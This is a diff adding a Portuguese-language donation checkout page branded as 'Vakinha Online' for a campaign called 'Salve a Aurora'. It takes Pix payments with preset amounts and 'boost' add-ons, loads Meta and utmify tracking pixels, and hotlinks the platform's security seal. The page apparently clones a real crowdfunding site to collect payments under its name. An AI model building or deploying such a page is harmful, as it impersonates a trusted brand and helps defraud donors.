@@ -1,0 +1,797 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout</title>
+    <link rel="icon" href="images/favicon.ico">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Biblioteca QRCode.js para gerar QR codes -->
+    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.1/build/qrcode.min.js"></script>
+
+    
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-xcod-sck
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+    <!-- Meta Pixel Code -->
+    <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src='https://connect.facebook.net/en_US/fbevents.js';
+      s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script');
+    
+      fbq('init', '1532292187820933'); // Substitua com o ID do seu pixel
+      fbq('track', 'PageView');
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none"
+           src="https://www.facebook.com/tr?id=1532292187820933&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Meta Pixel Code -->
+    <!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1205911641466984');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1205911641466984&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+    <script>
+  window.pixelId = "6927d1f2fe4e67e077a86173";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <script>
+  window.pixelId = "693784abaa2a2cc4f70d1228";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    </head>
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Inter', sans-serif;
+}
+
+body {
+    padding: 20px;
+    max-width: 600px;
+    margin: 0 auto;
+}
+
+h1 {
+    color: #4A2B0F;
+    font-size: 20px;
+    margin-bottom: 8px;
+}
+
+.id-number {
+    color: #4A2B0F;
+    font-size: 14px;
+    margin-bottom: 20px;
+}
+
+
+.section-title {
+    font-size: 16px;
+    font-weight: 500;
+    color: #333;
+    margin-bottom: 15px;
+}
+
+.value-input {
+    display: flex;
+    position: relative;
+    align-items: center;
+    margin-bottom: 5px;
+}
+
+.currency-prefix {
+    background-color: #f5f5f5;
+    border: 1px solid #ddd;
+    border-right: none;
+    border-radius: 5px 0 0 5px;
+    padding: 10px 15px;
+    display: flex;
+    align-items: center;
+    color: #333;
+    font-weight: 500;
+}
+
+.value-field {
+    flex: 1;
+    border: 1px solid #ddd;
+    border-radius: 0 5px 5px 0;
+    padding: 10px 15px;
+    font-size: 16px;
+    outline: none;
+}
+
+.payment-methods {
+    display: flex;
+    gap: 10px;
+    margin-bottom: 30px;
+}
+
+.payment-option {
+    border: 1px solid #ddd;
+    border-radius: 5px;
+    padding: 10px 15px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    cursor: pointer;
+}
+
+.payment-option.pix {
+    background-color: #22c55e;
+    border-color: #22c55e;
+    color: white;
+}
+
+.radio-button {
+    width: 18px;
+    height: 18px;
+    border: 2px solid #ddd;
+    border-radius: 50%;
+    display: inline-block;
+    position: relative;
+}
+
+.payment-option.pix .radio-button {
+    border-color: white;
+}
+
+.payment-option.pix .radio-button::after {
+    content: "";
+    width: 10px;
+    height: 10px;
+    background-color: white;
+    border-radius: 50%;
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+}
+
+.charity-options {
+    border: 1px dashed #ccc;
+    border-radius: 5px;
+    display: flex;
+    margin-bottom: 30px;
+    overflow: hidden;
+}
+
+.charity-item {
+    flex: 1;
+    padding: 15px;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 5px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    background-color: white;
+    color: #333;
+    border-right: 1px dashed #a1a1a1;
+    height: 120px;
+    justify-content: center;
+}
+
+.charity-item:last-child {
+    border-right: none;
+}
+
+.charity-item.selected {
+    background-color: rgba(34, 197, 94, 0.6);
+    color: #ffffff;
+    text-shadow: 1px 1px 2px rgba(85, 85, 85, 0.5);
+}
+
+.charity-item.selected:last-child {
+    border-right: none;
+}
+
+.charity-icon {
+    width: 40px;
+    height: 40px;
+    /* border-radius: 50%; */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin-bottom: 5px;
+    overflow: hidden;
+}
+
+.charity-icon img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+}
+
+.heart-icon {
+    
+}
+
+.society-icon {
+    /* background-color: #f0fdf4; */
+}
+
+.lucky-icon {
+   
+}
+
+.charity-item.selected .charity-icon {
+   
+}
+
+.charity-item.selected .charity-icon img {
+    filter: none;
+}
+
+.charity-name {
+    font-size: 12px;
+    font-weight: 500;
+}
+
+.charity-price {
+    font-size: 12px;
+    color: #666;
+}
+
+.charity-item.selected .charity-price {
+    color: white;
+}
+
+.lucky-text {
+    font-size: 14px;
+    font-weight: 500;
+}
+
+.summary {
+    margin-bottom: 20px;
+}
+
+.summary-item {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 10px;
+    color: #666;
+    font-size: 14px;
+}
+
+.divider {
+    height: 1px;
+    background-color: #eee;
+    margin: 15px 0;
+}
+
+.checkbox-container {
+    display: flex;
+    align-items: flex-start;
+    gap: 10px;
+    margin-bottom: 5px;
+}
+
+.custom-checkbox {
+    width: 18px;
+    height: 18px;
+    border: 1px solid #ddd;
+    border-radius: 3px;
+    margin-top: 2px;
+}
+
+.checkbox-label {
+    font-size: 14px;
+    color: #333;
+}
+
+.privacy-notice {
+    font-size: 12px;
+    color: #666;
+    margin-bottom: 30px;
+    margin-left: 28px;
+}
+
+.contribute-button {
+    background-color: #22c55e;
+    color: white;
+    border: none;
+    border-radius: 5px;
+    padding: 15px;
+    width: 100%;
+    font-size: 16px;
+    font-weight: 500;
+    cursor: pointer;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    transition: all 0.3s ease;
+}
+
+.contribute-button:disabled {
+    background-color: #ccc;
+    cursor: not-allowed;
+    opacity: 0.8;
+}
+
+.contribute-button.processing {
+    position: relative;
+    color: transparent;
+}
+
+.contribute-button.processing::after {
+    content: "";
+    position: absolute;
+    left: 50%;
+    top: 50%;
+    width: 24px;
+    height: 24px;
+    margin: -12px 0 0 -12px;
+    border: 3px solid #fff;
+    border-radius: 50%;
+    border-top-color: transparent;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    to { transform: rotate(360deg); }
+}
+
+.error-message {
+    color: #dc2626;
+    font-size: 12px;
+    margin-top: 5px;
+    display: none;
+}
+
+.preset-values {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 10px;
+    justify-content: center;
+    margin: 15px 0;
+    overflow: visible;
+}
+
+.preset-value-btn {
+    padding: 10px 20px;
+    border: 2px solid #e0e0e0;
+    border-radius: 8px;
+    background-color: white;
+    color: #333;
+    font-size: 15px;
+    cursor: pointer;
+    transition: all 0.3s ease;
+	/* flex: 0 0 calc(33.333% - 7px); */ /*3 colunas */
+    /* flex: 0 0 calc(25% - 7.5px); */ /* 4 colunas */
+    flex: 0 0 calc(50% - 5px); /* 2 colunas de 4*/
+    min-width: 90px;
+    white-space: nowrap;
+    position: relative;
+}
+
+.preset-value-btn.has-badge {
+    overflow: visible;
+}
+
+.badge-escolhido {
+    position: absolute;
+    top: -8px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: linear-gradient(135deg, #ff4444, #ff6b35);
+    color: #fff;
+    padding: 4px 12px;
+    border-radius: 8px;
+    font-size: 10px;
+    font-weight: 600;
+    white-space: nowrap;
+    z-index: 100;
+    text-transform: uppercase;
+    display: block;
+    pointer-events: none;
+    box-shadow: 0 2px 8px rgba(255, 68, 68, 0.4);
+}
+
+.preset-value-btn.active {
+    background-color: #24CA68;
+    color: white;
+    border-color: #24CA68;
+}
+</style>
+
+<body>
+    <div class="main-content">
+        <header>
+            <div class="container">
+                <div class="content-header d-flex align-items-center justify-content-between">
+                    <div class="logo">
+                        <a href="#"><img src="images/logo.svg" alt="Vakinha Online"></a>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <br>
+        <h1>Salve a Aurora</h1>
+        <div class="id-number">ID: 9526247</div>
+        <div style="margin-bottom: 0.5rem;font-weight: 600;"><label class="sc-fqkvVR ilmRzc">Valor da contribuição</label></div>
+        <div class="value-input">
+            <div class="currency-prefix">R$</div>
+            <input type="tel" id="contribution-input" class="value-field" placeholder="Digite o valor da contribuição">
+        </div>
+        <div id="error-message" class="error-message">
+            Valor mínimo da doação é de R$ 20,00
+        </div>
+        <div id="max-error-message" class="error-message">
+            Valor máximo permitido é de R$ 1.000,00
+        </div>
+        <div class="preset-values" style="display: flex;flex-wrap: wrap;gap: 10px;justify-content: center;margin: 15px 0;">
+        	<button class="preset-value-btn" data-value="30">R$ 30,00</button>
+        	<button class="preset-value-btn has-badge" data-value="50">
+        		<span class="badge-escolhido">MAIS ESCOLHIDO</span>
+        		R$ 50,00
+        	</button>
+        	<button class="preset-value-btn" data-value="75">R$ 75,00</button>
+        	<button class="preset-value-btn" data-value="100">R$ 100,00</button>
+        	<button class="preset-value-btn" data-value="200">R$ 200,00</button>
+        	<button class="preset-value-btn" data-value="500">R$ 500,00</button>
+        	<button class="preset-value-btn" data-value="750">R$ 750,00</button>
+        	<button class="preset-value-btn" data-value="1000">R$ 1.000,00</button>
+        	<!-- <button class="preset-value-btn" data-value="2000">R$ 2.000,00</button> -->
+        </div>
+        <div class="section-title">Forma de pagamento</div>
+        <div class="payment-methods">
+            <div class="payment-option pix">
+                <span class="radio-button"></span>
+                <span>Pix</span>
+            </div>
+        </div>
+        <div class="section-title">Turbine sua doação</div>
+        <div class="summary-item">
+            <span>Ajude MUITO MAIS turbinando sua doação 💚</span>
+        </div>
+        <div class="charity-options">
+            <div class="charity-item" data-value="10.00">
+                <div class="charity-icon heart-icon">
+                    <img src="https://i.ibb.co/r2QJc0NM/car1.png" alt="Ícone de Coração">
+                </div>
+                <div class="charity-name">Auxílio transporte</div>
+                <div class="charity-price">R$ 10,00</div>
+            </div>
+            <div class="charity-item" data-value="25.00">
+                <div class="charity-icon heart-icon">
+                    <img src="https://i.ibb.co/g0bj4n0/doarremedios.webp" alt="Ícone de Coração">
+                </div>
+                <div class="charity-name">Ajuda com medicações</div>
+                <div class="charity-price">R$ 25,00</div>
+            </div>
+            <div class="charity-item" data-value="85.00">
+                <div class="charity-icon society-icon" style="overflow:unset">
+                    <img src="https://i.ibb.co/Kp20pSVR/lunaa-removebg-preview.png" alt="Ícone de Sociedade">
+                </div>
+                <div class="charity-name">Doar cesta básica</div>
+                <div class="charity-price">R$ 85,00</div>
+            </div>
+        </div>
+        <div class="summary">
+            <div class="summary-item">
+                <span>Contribuição:</span>
+                <span>R$ 0,00</span>
+            </div>
+            <div class="divider"></div>
+            <div class="summary-item">
+                <span>Total:</span>
+                <span>R$ 0,00</span>
+            </div>
+        </div>
+        <button class="contribute-button">Contribuir</button>
+
+    </div>
+<!-- Texto acima do selo (com espaçamento superior e inferior) -->
+<div style="font-size: 10px; color: #6c757d; margin-top: 24px; margin-bottom: 16px; font-family: 'Lato', Arial, sans-serif;">
+  Ao clicar no botão acima você declara que é maior de 18 anos, leu e está de acordo com os <strong>Termos, Taxas e Prazos</strong>.
+</div>
+
+<!-- Bloco do selo de segurança -->
+<div class="selo-container" style="display: flex; align-items: center; gap: 10px; background-color: #f1f1f1; padding: 10px; border-radius: 6px; margin-bottom: 16px;">
+  <picture>
+    <source srcset="https://static.vakinha.com.br/static/v4/SELO.png?ims=115x40" width="115" height="40">
+    <img srcset="https://static.vakinha.com.br/static/v4/SELO.png?ims=115x40" alt="Selo de segurança" style="display: block;">
+  </picture>
+  <div style="color: #6c757d; font-family: 'Lato', Arial, sans-serif; font-size: 11px;">
+    Garantimos uma <strong>experiência segura</strong> para todos os nossos doadores.
+  </div>
+</div>
+
+<!-- Texto abaixo do selo (com espaçamento inferior) -->
+<div style="font-size: 9px; color: #6c757d; font-family: 'Lato', Arial, sans-serif; margin-bottom: 44px;">
+  Informamos que o preenchimento do seu cadastro completo estará disponível em seu painel pessoal na plataforma após a conclusão desta doação. Importante destacar a importância da adequação do seu cadastro, informando o <strong>nome social</strong>, caso o utilize.
+</div>
+    <script>
+	//nlo params
+	function getUrlParams() {
+		const params = new URLSearchParams(window.location.search);
+		let paramsObject = {};
+		params.forEach((value, key) => {
+			paramsObject[key] = value;
+		});
+		return paramsObject;
+	}
+
+	function redirectWithParams(baseUrl) {
+		const params = getUrlParams();
+		const url = new URL(baseUrl, window.location);
+
+		Object.keys(params).forEach(key => {
+			url.searchParams.set(key, params[key]);
+		});
+
+		window.location.href = url.toString();
+	}
+
+        document.addEventListener("DOMContentLoaded", () => {
+            // Elementos do formulário
+            const contributionInput = document.getElementById("contribution-input")
+            const errorMessage = document.getElementById("error-message")
+            const maxErrorMessage = document.getElementById("max-error-message")
+            const contributeButton = document.querySelector(".contribute-button")
+            const paymentOption = document.querySelector(".payment-option.pix")
+            const charityItems = document.querySelectorAll(".charity-item")
+            //const summaryContribution = document.querySelector(".summary-item:first-child span:last-child")
+            const summaryTotal = document.querySelector(".summary-item:last-child span:last-child")
+
+            const presetButtons = document.querySelectorAll(".preset-value-btn")
+
+            // Variáveis de controle
+            let selectedAmount = 0
+            const additionalAmounts = [] // Array para armazenar múltiplos valores adicionais
+            const MIN_AMOUNT = 20
+            const MAX_AMOUNT = 1000
+
+            // Definir os valores corretos para cada item
+            const itemValues = {
+                "Multiplicador de impacto": 10.00,
+                //"Doe 1kg de alimento": 15.00,
+                //"Materiais de Estudo": 15.00,
+                //"Brinquedo solidário": 15.00,
+                "Vitaminas básicas": 25.00,
+                "Doar cesta básica": 85.00,
+            }
+
+            // Formatar valor como moeda
+            function formatCurrency(value) {
+                return Number(Number.parseFloat(value).toFixed(2)).toLocaleString("pt-BR", {
+                    minimumFractionDigits: 2,
+                    maximumFractionDigits: 2,
+                })
+            }
+
+            // Atualizar resumo
+            function updateSummary() {
+                // Calcular o total somando o valor base e todos os adicionais selecionados
+                const additionalTotal = additionalAmounts.reduce((sum, amount) => sum + amount, 0)
+                const total = selectedAmount + additionalTotal
+
+                //summaryContribution.textContent = `R$ ${formatCurrency(selectedAmount)}`
+                summaryTotal.textContent = `R$ ${formatCurrency(total)}`
+
+                // Arredondar para 2 casas decimais para evitar problemas de comparação
+                const roundedTotal = Math.round(total * 100) / 100
+
+                // Habilitar/desabilitar botão com base no valor mínimo
+                if (roundedTotal >= MIN_AMOUNT && roundedTotal <= MAX_AMOUNT) {
+                    contributeButton.classList.add("active")
+                    errorMessage.style.display = "none"
+                    maxErrorMessage.style.display = "none"
+                } else if (roundedTotal > MAX_AMOUNT) {
+                    contributeButton.classList.remove("active")
+                    errorMessage.style.display = "none"
+                    maxErrorMessage.style.display = "block"
+                } else {
+                    contributeButton.classList.remove("active")
+                    errorMessage.style.display = "block"
+                    maxErrorMessage.style.display = "none"
+                }
+
+                // Log para debug
+                console.log("Valores adicionais:", additionalAmounts)
+                console.log("Total adicional:", additionalTotal)
+                console.log("Total geral:", total)
+            }
+
+            // Inicializar máscara de moeda no input
+            function initCurrencyMask() {
+                // Verificar se há um valor na URL
+                const urlParams = new URLSearchParams(window.location.search);
+                const initialValue = urlParams.get('valor');
+                
+                contributionInput.addEventListener("input", (e) => {
+                    let value = e.target.value.replace(/\D/g, "")
+                    value = (Number.parseInt(value) / 100).toFixed(2)
+                    e.target.value = formatCurrency(value)
+
+                    // Corrigir a conversão do valor para número
+                    selectedAmount = Number.parseFloat(value)
+                    updateSummary()
+                })
+
+                if (initialValue) {
+                    // Tratar valores como '50' ou 'R$ 50,00'
+                    let numericValue = initialValue.replace(/[^\d,.]/g, "").replace(",", ".");
+                    selectedAmount = parseFloat(numericValue) || 0;
+                    contributionInput.value = formatCurrency(selectedAmount);
+                    
+                    // Ativar botão de preset correspondente se existir
+                    presetButtons.forEach(btn => {
+                        if (parseFloat(btn.dataset.value) === selectedAmount) {
+                            btn.classList.add("active");
+                        }
+                    });
+                } else {
+                    // Inicializar com 0,00 se não houver valor
+                    contributionInput.value = formatCurrency(0)
+                }
+                updateSummary()
+            }
+
+            // Configurar os itens de caridade
+            function setupCharityItems() {
+                // Mapa para rastrear quais itens estão selecionados e seus índices no array
+                const selectedItemsMap = new Map()
+
+                charityItems.forEach((item) => {
+                    // Obter o nome do item
+                    const itemName = item.querySelector(".charity-name").textContent
+
+                    // Definir o valor correto baseado no nome
+                    if (itemValues[itemName]) {
+                        item.dataset.value = itemValues[itemName].toString()
+                    }
+
+                    // Adicionar evento de clique
+                    item.addEventListener("click", function () {
+                        const value = Number.parseFloat(this.dataset.value)
+                        const itemId = this.dataset.value + "-" + itemName // ID único para o item
+
+                        // Toggle seleção
+                        if (this.classList.contains("selected")) {
+                            // Remover seleção
+                            this.classList.remove("selected")
+
+                            // Se o item estiver no mapa, remova-o do array usando o índice armazenado
+                            if (selectedItemsMap.has(itemId)) {
+                                const index = selectedItemsMap.get(itemId)
+                                additionalAmounts.splice(index, 1)
+
+                                // Atualizar os índices no mapa após a remoção
+                                selectedItemsMap.forEach((val, key) => {
+                                    if (val > index) {
+                                        selectedItemsMap.set(key, val - 1)
+                                    }
+                                })
+
+                                // Remover o item do mapa
+                                selectedItemsMap.delete(itemId)
+                            }
+                        } else {
+                            // Adicionar seleção
+                            this.classList.add("selected")
+
+                            // Adicionar valor ao array e armazenar seu índice no mapa
+                            additionalAmounts.push(value)
+                            selectedItemsMap.set(itemId, additionalAmounts.length - 1)
+                        }
+
+                        updateSummary()
+                    })
+                })
+            }
+
+            // Inicializar
+            function init() {
+                // Inicializar máscara de moeda
+                initCurrencyMask()
+
+                // Configurar itens de caridade
+                setupCharityItems()
+
+                // Marcar PIX como selecionado por padrão
+                paymentOption.classList.add("selected")
+
+                // Esconder mensagens de erro inicialmente
+                errorMessage.style.display = "none"
+                maxErrorMessage.style.display = "none"
+
+                // Atualizar resumo inicial
+                //updateSummary()
+            }
+
+            presetButtons.forEach((button) => {
+                button.addEventListener("click", () => {
+                    // Remover classe 'active' de todos os botões
+                    presetButtons.forEach(btn => btn.classList.remove("active"))
+            
+                    // Adicionar classe 'active' ao botão clicado
+                    button.classList.add("active")
+            
+                    // Obter valor do botão e atualizar o campo de input
+                    const value = parseFloat(button.dataset.value)
+            
+                    selectedAmount = value
+                    contributionInput.value = formatCurrency(value)
+            
+                    // Atualizar resumo
+                    updateSummary()
+                })
+            })
+
+            // Processar pagamento
+            contributeButton.addEventListener("click", () => {
+                const additionalTotal = additionalAmounts.reduce((sum, amount) => sum + amount, 0)
+                const total = selectedAmount + additionalTotal
+            
+                // Verificar se o total é um número válido
+                if (isNaN(total)) {
+                    errorMessage.textContent = "O valor inserido é inválido."
+                    errorMessage.style.display = "block"
+                    return
+                }
+            
+                // Arredondar para 2 casas decimais para evitar problemas de comparação
+                const roundedTotal = Math.round(total * 100) / 100
+            
+                // Verificar valor mínimo
+                if (roundedTotal < MIN_AMOUNT) {
+                    errorMessage.style.display = "block"
+                    return
+                }
+            
+                // Verificar valor máximo
+                if (roundedTotal > MAX_AMOUNT) {
+                    maxErrorMessage.style.display = "block"
+                    return
+                }
+            
+                // Mostrar indicador de carregamento no botão
+                contributeButton.innerHTML = '<div class="spinner-small"></div> Processando...'
+                contributeButton.disabled = true
+            
+                // ✅ REDIRECIONAR COM VALOR E PARÂMETROS UTM
+                redirectWithParams("../pagamento/?valor=" + roundedTotal);
+            })
+
+            // Inicializar tudo
+            init()
+        })
+    </script>
+</body>
+</html>
